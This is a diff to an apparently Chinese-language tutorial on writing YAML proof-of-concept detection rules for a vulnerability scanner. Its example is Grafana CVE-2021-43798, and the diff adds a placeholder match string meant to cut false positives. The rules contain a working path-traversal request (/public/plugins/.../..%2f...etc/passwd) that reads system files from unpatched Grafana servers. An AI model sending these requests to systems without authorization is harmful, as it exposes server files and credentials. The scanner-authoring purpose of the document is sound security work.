@@ -213,7 +213,7 @@ rules:
             method: GET
             path: /public/plugins/barchart/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
         expression: |
-            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
+            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string) && response.body_string.contains("xxxxx")
     r7:
         ...
 expression: |
@@ -231,7 +231,7 @@ detail:
 - 也就是说我们不需要将产品指纹相关的内容放置到poc中作为check规则，这些内容应该交给专门的工具，比如xapp去实现，这样解耦，工具之间才能更灵活的调度，也不会出现发包过多的问题
 - 而像`存在某个路径/文件，这个漏洞才存在`这种情况，去写一个check规则来降低发包量是完全合理的。
 
-对于这个漏洞来说，没有什么明显的特征，所以优化为下述内容即可
+对于这个漏洞来说，没有什么明显的特征，所以优化为下述内容即可，注意添加了response.body_string.contains("xxxxx")，用来指代一些其他的特征，以防止误报。
 ```yaml
 name: poc-yaml-grafana-cve-2021-43798-unauth-fileread
 transport: http
@@ -285,7 +285,7 @@ rules:
             method: GET
             path: /public/plugins/{{plugin}}/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{{file}}
         expression: |
-            response.status == 200 && re.matches(response.body_string)
+            response.status == 200 && re.matches(response.body_string) && response.body_string.contains("xxxxx")
 expression: r0()
 detail:
     author: test
